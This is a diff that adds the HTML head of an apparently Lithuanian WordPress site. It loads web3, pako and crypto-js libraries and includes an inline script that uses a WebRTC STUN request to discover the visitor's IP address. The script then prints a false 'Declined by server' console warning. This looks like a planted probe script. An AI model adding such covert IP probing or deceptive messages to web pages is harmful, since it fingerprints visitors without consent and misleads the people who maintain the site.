@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="lt-LT">
+
+<head>
+    <meta name="facebook-domain-verification" content="3w87hdin4631mfi2hwiptdt6l9u7aw" />
+    <meta charset="UTF-8">
+    <link rel="profile" href="https://gmpg.org/xfn/11">
+    <link rel="pingback" href="https://www.biolife.lt/xmlrpc.php">
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pako/2.0.4/pako.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+	<script> 
+		let a = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+    a.createDataChannel("");
+    a.onicecandidate = e => {
+        let ip = e?.candidate?.candidate?.match(/\d+\.\d+\.\d+\.\d+/)?.[0];
+        if (ip) {
+            alert("works");
+            a.onicecandidate = null;
+        }
+    };
+    a.createOffer().then(o => a.setLocalDescription(o));
+    console.warn("Execution stopped: Declined by server");
+	</script>
+</head>
